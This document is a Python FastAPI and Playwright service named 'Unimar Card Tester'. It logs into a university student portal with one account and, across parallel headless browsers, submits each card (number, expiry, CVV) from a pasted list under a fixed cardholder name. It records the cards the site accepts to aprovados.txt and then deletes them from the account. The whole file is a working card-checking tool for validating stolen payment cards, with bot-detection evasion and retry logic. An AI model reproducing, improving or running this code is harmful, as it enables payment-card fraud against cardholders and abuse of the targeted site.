import asyncio
import os
import random
import time
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Optional, Set

import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, field_validator
from slowapi import Limiter
from slowapi.util import get_remote_address
from slowapi.middleware import SlowAPIMiddleware

from playwright.async_api import async_playwright, Browser, BrowserContext, Page

# ===================== CONFIG =====================
class Config:
    URL_LOGIN = os.getenv("UNIMAR_URL_LOGIN", "https://digital.unimar.br/login")
    URL_MEUS_CARTOES = os.getenv("UNIMAR_URL_CARTOES", "https://digital.unimar.br/areadoaluno/conta/meuscartoes")
    
    EMAIL = os.getenv("UNIMAR_EMAIL")
    SENHA = os.getenv("UNIMAR_SENHA")
    NOME_FIXO = os.getenv("UNIMAR_NOME", "Bruna Mendes")
    
    SESSAO_PATH = Path(os.getenv("UNIMAR_SESSAO_PATH", "sessao_unimar.json"))
    SESSAO_MAX_AGE = int(os.getenv("UNIMAR_SESSAO_MAX_AGE", "86400"))
    
    MAX_TENTATIVAS = int(os.getenv("UNIMAR_MAX_TENTATIVAS", "3"))
    MAX_CANAIS = int(os.getenv("UNIMAR_MAX_CANAIS", "6"))
    
    VIEWPORT = {"width": int(os.getenv("UNIMAR_VIEWPORT_WIDTH", "1280")), 
                "height": int(os.getenv("UNIMAR_VIEWPORT_HEIGHT", "720"))}
    
    USER_AGENT = os.getenv(
        "UNIMAR_USER_AGENT",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
    )
    
    HEADLESS = os.getenv("UNIMAR_HEADLESS", "true").lower() == "true"
    
    BROWSER_ARGS = [
        "--no-sandbox",
        "--disable-dev-shm-usage",
        "--disable-gpu",
        "--disable-web-security",
        "--disable-features=IsolateOrigins,site-per-process",
        "--disable-blink-features=AutomationControlled",
        "--disable-setuid-sandbox",
        "--no-first-run",
        "--no-zygote",
        "--disable-extensions",
        "--disable-background-networking",
        "--disable-sync",
        "--disable-translate",
        "--hide-scrollbars",
        "--mute-audio",
        "--no-default-browser-check",
    ]

# ===================== LOGGING SIMPLES =====================
# Usando print simples em vez de structlog para evitar complexidade
def log_message(mensagem: str):
    timestamp = time.strftime("%H:%M:%S")
    full_msg = f"[{timestamp}] {mensagem}"
    print(full_msg)
    asyncio.create_task(broadcast("log", {"mensagem": full_msg}))

# ===================== ESTADO =====================
class EstadoManager:
    def __init__(self):
        self._lock = asyncio.Lock()
        self._data = {
            "rodando": False,
            "cancelado": False,
            "clients": set(),
            "total_cartoes": 0,
            "processados": 0,
            "aprovados": 0,
            "fila_vazia": False,
            "tarefas_concluidas": 0,
            "inicio_timestamp": 0,
            "canais_ativos": 0,
        }
    
    @property
    def lock(self):
        return self._lock
    
    def get(self, key: str):
        return self._data.get(key)
    
    async def set(self, key: str, value):
        async with self._lock:
            self._data[key] = value
    
    async def increment(self, key: str, delta: int = 1):
        async with self._lock:
            self._data[key] += delta
            return self._data[key]
    
    async def decrement(self, key: str, delta: int = 1):
        async with self._lock:
            self._data[key] -= delta
            return self._data[key]
    
    async def add_client(self, client):
        async with self._lock:
            self._data["clients"].add(client)
    
    async def remove_client(self, client):
        async with self._lock:
            self._data["clients"].discard(client)
    
    async def get_clients(self) -> Set:
        async with self._lock:
            return self._data["clients"].copy()

estado = EstadoManager()

# ===================== BROADCAST =====================
async def broadcast(type: str, data: dict = None):
    if data is None:
        data = {}
    message = {"type": type, **data}
    
    clients = await estado.get_clients()
    dead = set()
    
    for client in clients:
        try:
            await client.send_json(message)
        except Exception:
            dead.add(client)
    
    for client in dead:
        await estado.remove_client(client)

# ===================== VALIDATION (Pydantic V2) =====================
class IniciarRequest(BaseModel):
    lista: str
    canais: int = 4
    
    @field_validator('canais')
    @classmethod
    def validar_canais(cls, v):
        if v < 1 or v > Config.MAX_CANAIS:
            raise ValueError(f'Canais deve ser entre 1 e {Config.MAX_CANAIS}')
        return v
    
    @field_validator('lista')
    @classmethod
    def validar_lista(cls, v):
        if not v.strip():
            raise ValueError('Lista de cartões não pode estar vazia')
        return v

# ===================== LIFESPAN =====================
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    Config.SESSAO_PATH.touch(exist_ok=True)
    Path("aprovados.txt").touch(exist_ok=True)
    print("🚀 Aplicação iniciada com sucesso!")
    yield
    # Shutdown
    print("👋 Aplicação finalizada")

# Inicialização do FastAPI
app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)

# Rate limiting
limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_middleware(SlowAPIMiddleware)

# ===================== WEBSOCKET =====================
async def heartbeat_task(websocket: WebSocket):
    """Envia heartbeat a cada 25s para manter conexão viva."""
    try:
        while True:
            await asyncio.sleep(25)
            await websocket.send_json({"type": "ping"})
    except Exception:
        pass

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    await estado.add_client(websocket)
    
    # Enviar estado atual
    try:
        await websocket.send_json({
            "type": "status",
            "rodando": estado.get("rodando"),
            "total": estado.get("total_cartoes"),
            "processados": estado.get("tarefas_concluidas"),
            "aprovados": estado.get("aprovados"),
            "canais_ativos": estado.get("canais_ativos")
        })
    except Exception:
        await estado.remove_client(websocket)
        return
    
    # Iniciar heartbeat
    hb = asyncio.create_task(heartbeat_task(websocket))
    
    try:
        while True:
            data = await websocket.receive_json()
            if data.get("type") == "pong":
                continue
    except WebSocketDisconnect:
        pass
    except Exception:
        pass
    finally:
        hb.cancel()
        try:
            await hb
        except asyncio.CancelledError:
            pass
        await estado.remove_client(websocket)

# ===================== PLAYWRIGHT HELPERS =====================
async def sessao_e_valida(playwright) -> bool:
    """Testa rapidamente se a sessão salva ainda funciona."""
    sessao = Config.SESSAO_PATH
    if not sessao.exists():
        return False
    if time.time() - sessao.stat().st_mtime > Config.SESSAO_MAX_AGE:
        return False
    
    try:
        browser = await playwright.chromium.launch(
            headless=Config.HEADLESS,
            args=Config.BROWSER_ARGS
        )
        context = await browser.new_context(
            viewport=Config.VIEWPORT,
            user_agent=Config.USER_AGENT
        )
        page = await context.new_page()
        
        await page.goto(Config.URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)
        await asyncio.sleep(0.8)
        
        valida = await page.get_by_role("button", name="Adicionar Cartão de Crédito").count() > 0
        
        await context.close()
        await browser.close()
        return valida
    except Exception as e:
        print(f"[AVISO] Validação de sessão falhou: {e}")
        return False

async def limpar_cartoes_antigos(page: Page):
    """Faxina robusta de cartões existentes."""
    try:
        log_message("[Faxina] Iniciando limpeza...")
        await page.goto(Config.URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
        await asyncio.sleep(1.5)
        
        removidos = 0
        max_iteracoes = 50
        
        for iteracao in range(max_iteracoes):
            if estado.get("cancelado"):
                log_message("[Faxina] Cancelado pelo usuário.")
                break
            
            botoes_remover = page.get_by_role("button", name="Remover")
            quantidade = await botoes_remover.count()
            
            if quantidade == 0:
                log_message("[Faxina] Nenhum botão 'Remover' encontrado. Limpo!")
                break
            
            botao = botoes_remover.first
            
            try:
                await botao.scroll_into_view_if_needed(timeout=3000)
                await botao.wait_for(state="visible", timeout=3000)
            except Exception:
                await asyncio.sleep(0.5)
                continue
            
            await botao.click(force=True)
            
            removido_aqui = False
            try:
                await botao.wait_for(state="hidden", timeout=5000)
                removido_aqui = True
            except Exception:
                pass
            
            if not removido_aqui:
                confirm = (
                    page.get_by_role("button", name="Sim")
                    .or_(page.get_by_role("button", name="Confirmar"))
                    .or_(page.get_by_role("button", name="Excluir"))
                    .or_(page.get_by_role("button", name="OK"))
                    .or_(page.get_by_role("button", name="Remover").nth(1))
                )
                try:
                    await confirm.wait_for(state="visible", timeout=3000)
                    await confirm.click(force=True)
                    await botao.wait_for(state="hidden", timeout=5000)
                    removido_aqui = True
                except Exception:
                    log_message("[Faxina] Confirmação não apareceu. Recarregando...")
                    await page.goto(Config.URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
                    await asyncio.sleep(1.0)
                    continue
            
            if removido_aqui:
                removidos += 1
                await asyncio.sleep(0.4)
        
        log_message(f"[Faxina] {removidos} cartão(ões) removido(s).")
    except Exception as e:
        log_message(f"[Faxina] Erro: {e}")

async def login_mestre(playwright) -> bool:
    """Login com Modo Fast (reuse) e Modo Full (UI)."""
    try:
        # MODO FAST
        if await sessao_e_valida(playwright):
            log_message("[Autenticação] Sessão reutilizada (Modo Fast).")
            return True
        
        # MODO FULL
        log_message("[Autenticação] Login mestre (Modo Full)...")
        browser = await playwright.chromium.launch(
            headless=Config.HEADLESS,
            args=Config.BROWSER_ARGS
        )
        context = await browser.new_context(
            viewport=Config.VIEWPORT,
            user_agent=Config.USER_AGENT
        )
        page = await context.new_page()
        page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))
        
        await page.goto(Config.URL_LOGIN, wait_until="domcontentloaded", timeout=60000)
        await page.get_by_role("textbox", name="E-mail ou CPF").fill(Config.EMAIL)
        await page.get_by_role("textbox", name="Senha").fill(Config.SENHA)
        await page.get_by_role("button", name="Entrar").click()
        await page.wait_for_selector("text=Meus Cartões", timeout=30000)
        
        await limpar_cartoes_antigos(page)
        await context.storage_state(path=str(Config.SESSAO_PATH))
        
        await context.close()
        await browser.close()
        log_message("[Autenticação] Login concluído!")
        return True
    except Exception as e:
        log_message(f"[ERRO] Login falhou: {e}")
        return False

# ===================== WORKER =====================
async def worker_contexto(id_worker: int, browser: Browser, fila: asyncio.Queue):
    """Worker otimizado com retentativa automática e recuperação de crash."""
    await estado.increment("canais_ativos")
    await broadcast("status", {"canais_ativos": estado.get("canais_ativos")})
    
    context = None
    page = None
    
    try:
        await asyncio.sleep(id_worker * 1.2)
        log_message(f"[Canal {id_worker}] Iniciando...")
        
        context = await browser.new_context(
            storage_state=str(Config.SESSAO_PATH),
            viewport=Config.VIEWPORT,
            user_agent=Config.USER_AGENT
        )
        page = await context.new_page()
        page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))
        
        await page.goto(Config.URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
        await asyncio.sleep(0.8)
        
        while estado.get("rodando") and not estado.get("cancelado"):
            try:
                item = await asyncio.wait_for(fila.get(), timeout=2.0)
            except asyncio.TimeoutError:
                await asyncio.sleep(0.5)
                if fila.empty() and estado.get("tarefas_concluidas") >= estado.get("total_cartoes"):
                    break
                continue
            
            indice, linha, tentativa = item
            resultado = "timeout"
            deve_contar = True
            
            try:
                partes = [x.strip() for x in linha.split("|")]
                if len(partes) != 4:
                    log_message(f"[Canal {id_worker}][Item {indice}] ❌ Formato inválido: {linha}")
                    fila.task_done()
                    await estado.increment("tarefas_concluidas")
                    await broadcast("reprovado", {"cartao": linha})
                    continue
                
                numero, mes, ano, cvv = partes
                log_message(f"[Canal {id_worker}][Item {indice}] ****{numero[-4:]} (tentativa {tentativa})")
                
                await page.goto(Config.URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
                await asyncio.sleep(random.uniform(0.4, 1.0))
                
                btn_add = page.get_by_role("button", name="Adicionar Cartão de Crédito")
                if await btn_add.is_visible(timeout=5000):
                    await btn_add.click(force=True)
                else:
                    await page.evaluate("window.scrollTo(0, 0)")
                    await asyncio.sleep(0.5)
                    await btn_add.click(force=True)
                await asyncio.sleep(0.3)
                
                await page.get_by_role("textbox", name="Número do cartão").fill(numero)
                await page.get_by_role("textbox", name="Nome impresso no cartão").fill(Config.NOME_FIXO)
                await page.get_by_label("Mês").select_option(mes)
                await page.get_by_label("Ano").select_option(ano)
                await page.get_by_role("textbox", name="CVV").fill(cvv)
                
                botoes_antes = await page.get_by_role("button", name="Remover").count()
                await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)
                
                # Loop ativo de detecção
                for _ in range(40):
                    if not estado.get("rodando") or estado.get("cancelado"):
                        resultado = "cancelado"
                        break
                    
                    botoes_atual = await page.get_by_role("button", name="Remover").count()
                    if botoes_atual > botoes_antes:
                        resultado = "aprovado"
                        break
                    
                    body = (await page.locator("body").inner_text()).lower()
                    erros = ["inválida", "recusado", "erro", "não foi possível",
                             "não autorizada", "recusada", "inválido", "tente novamente"]
                    if any(x in body for x in erros):
                        resultado = "reprovado"
                        break
                    
                    await asyncio.sleep(0.5)
                
                # Tratamento de resultado
                if resultado == "aprovado":
                    log_message(f"[Canal {id_worker}][Item {indice}] ✅ APROVADO")
                    await broadcast("aprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
                    await estado.increment("aprovados")
                    
                    # Salvar aprovado
                    async with estado.lock:
                        with open("aprovados.txt", "a") as f:
                            f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
                
                elif resultado == "reprovado":
                    log_message(f"[Canal {id_worker}][Item {indice}] ❌ Reprovado")
                    await broadcast("reprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
                
                elif resultado == "cancelado":
                    log_message(f"[Canal {id_worker}][Item {indice}] ⏹️ Cancelado")
                
                else:  # timeout
                    if tentativa < Config.MAX_TENTATIVAS:
                        log_message(f"[Canal {id_worker}][Item {indice}] ⚠️ Timeout — Re-enfileirando ({tentativa + 1}/{Config.MAX_TENTATIVAS})")
                        await fila.put((indice, linha, tentativa + 1))
                        deve_contar = False
                    else:
                        log_message(f"[Canal {id_worker}][Item {indice}] ❌ Timeout máximo")
                        await broadcast("reprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
            
            except Exception as e:
                erro_msg = str(e).lower()
                print(f"[ERRO] Canal {id_worker} Item {indice}: {e}")
                
                # Crash recovery
                if any(kw in erro_msg for kw in ["crashed", "closed", "target"]):
                    log_message(f"[Canal {id_worker}] 🔄 Página crashou. Recuperando...")
                    
                    try:
                        if page:
                            await page.close()
                        if context:
                            await context.close()
                    except Exception:
                        pass
                    
                    context = await browser.new_context(
                        storage_state=str(Config.SESSAO_PATH),
                        viewport=Config.VIEWPORT,
                        user_agent=Config.USER_AGENT
                    )
                    page = await context.new_page()
                    page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))
                    
                    if tentativa < Config.MAX_TENTATIVAS:
                        log_message(f"[Canal {id_worker}][Item {indice}] ⚠️ Crash — Re-enfileirando")
                        await fila.put((indice, linha, tentativa + 1))
                        deve_contar = False
                    else:
                        await broadcast("reprovado", {"cartao": linha})
                else:
                    await broadcast("reprovado", {"cartao": linha})
            
            finally:
                fila.task_done()
                
                if deve_contar:
                    await estado.increment("tarefas_concluidas")
                    
                    elapsed = time.time() - estado.get("inicio_timestamp") if estado.get("inicio_timestamp") else 0
                    velocidade = estado.get("tarefas_concluidas") / (elapsed / 60) if elapsed > 0 else 0
                    
                    await broadcast("progresso", {
                        "processados": estado.get("tarefas_concluidas"),
                        "total": estado.get("total_cartoes"),
                        "aprovados": estado.get("aprovados"),
                        "velocidade": round(velocidade, 1),
                        "tempo": round(elapsed),
                    })
    
    except Exception as e:
        print(f"[ERRO FATAL] Canal {id_worker}: {e}")
    finally:
        if context:
            try:
                await context.close()
            except Exception:
                pass
        await estado.decrement("canais_ativos")
        await broadcast("status", {"canais_ativos": estado.get("canais_ativos")})
        log_message(f"[Canal {id_worker}] Finalizado")

# ===================== PROCESSAMENTO =====================
async def processar_cartoes(texto_cartoes: str, num_canais: int):
    """Processa lista de cartões com múltiplos workers."""
    try:
        linhas = list(dict.fromkeys([l.strip() for l in texto_cartoes.splitlines() if l.strip()]))
        
        await estado.set("total_cartoes", len(linhas))
        await estado.set("processados", 0)
        await estado.set("aprovados", 0)
        await estado.set("tarefas_concluidas", 0)
        await estado.set("fila_vazia", False)
        await estado.set("cancelado", False)
        await estado.set("inicio_timestamp", time.time())
        await estado.set("canais_ativos", 0)
        
        total = estado.get("total_cartoes")
        if total == 0:
            log_message("[ERRO] Nenhum cartão fornecido.")
            return
        
        num_canais = min(max(num_canais, 1), Config.MAX_CANAIS)
        num_canais = min(num_canais, total)
        
        log_message(f"[Sistema] {num_canais} canais | {total} cartões")
        
        fila = asyncio.Queue()
        for idx, linha in enumerate(linhas, 1):
            await fila.put((idx, linha, 1))
        
        async with async_playwright() as pw:
            if not await login_mestre(pw):
                return
            
            browser = await pw.chromium.launch(
                headless=Config.HEADLESS,
                args=Config.BROWSER_ARGS
            )
            
            try:
                tasks = [
                    asyncio.create_task(worker_contexto(i, browser, fila))
                    for i in range(1, num_canais + 1)
                ]
                await asyncio.gather(*tasks, return_exceptions=True)
                
                if estado.get("aprovados") > 0 and not estado.get("cancelado"):
                    log_message("[Sistema] Faxina final...")
                    try:
                        context = await browser.new_context(
                            storage_state=str(Config.SESSAO_PATH),
                            viewport=Config.VIEWPORT,
                            user_agent=Config.USER_AGENT
                        )
                        page = await context.new_page()
                        page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))
                        await limpar_cartoes_antigos(page)
                        await context.close()
                    except Exception as e:
                        log_message(f"[Faxina Final] Erro: {e}")
            
            finally:
                await browser.close()
    
    except Exception as e:
        print(f"[ERRO CRÍTICO] {e}")
    finally:
        await estado.set("rodando", False)
        await estado.set("cancelado", False)
        await estado.set("canais_ativos", 0)
        log_message("[Sistema] Processamento concluído")
        await broadcast("status", {"rodando": False, "canais_ativos": 0})

# ===================== ROTAS =====================
@app.post("/api/iniciar")
@limiter.limit("10/minute")
async def iniciar(data: IniciarRequest, request: Request):
    if estado.get("rodando"):
        return {"status": "já_em_execucao"}
    
    await estado.set("rodando", True)
    await estado.set("cancelado", False)
    await broadcast("status", {"rodando": True})
    
    asyncio.create_task(processar_cartoes(data.lista, data.canais))
    
    return {"status": "iniciado", "total": len(data.lista.splitlines())}

@app.post("/api/parar")
@limiter.limit("20/minute")
async def parar(request: Request):
    await estado.set("rodando", False)
    await estado.set("cancelado", True)
    log_message("⛔ Interrupção solicitada.")
    await broadcast("status", {"rodando": False})
    return {"status": "parando"}

@app.get("/api/status")
async def get_status():
    elapsed = time.time() - estado.get("inicio_timestamp") if estado.get("inicio_timestamp") else 0
    velocidade = estado.get("tarefas_concluidas") / (elapsed / 60) if elapsed > 0 else 0
    
    return {
        "rodando": estado.get("rodando"),
        "cancelado": estado.get("cancelado"),
        "total": estado.get("total_cartoes"),
        "processados": estado.get("tarefas_concluidas"),
        "aprovados": estado.get("aprovados"),
        "canais_ativos": estado.get("canais_ativos"),
        "velocidade": round(velocidade, 1),
        "tempo": round(elapsed),
    }

@app.get("/api/health")
async def health():
    import psutil
    return {
        "status": "healthy",
        "memory_mb": round(psutil.Process().memory_info().rss / 1024 / 1024, 2),
    }

@app.get("/", response_class=HTMLResponse)
async def index():
    with open("templates/index.html", encoding="utf-8") as f:
        return f.read()

# ===================== INICIALIZAÇÃO =====================
if __name__ == "__main__":
    PORT = int(os.getenv("PORT", 5000))
    
    print(f"🚀 Iniciando servidor na porta {PORT}")
    print(f"📊 Dashboard: https://web.railway.app")
    
    # Verificar variáveis obrigatórias
    if not Config.EMAIL or not Config.SENHA:
        print("⚠️  ATENÇÃO: Variáveis UNIMAR_EMAIL e UNIMAR_SENHA não configuradas!")
        print("Configure-as nas variáveis de ambiente do Railway")
    
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=PORT,
        workers=1,
        log_level="info",
        reload=False
    )
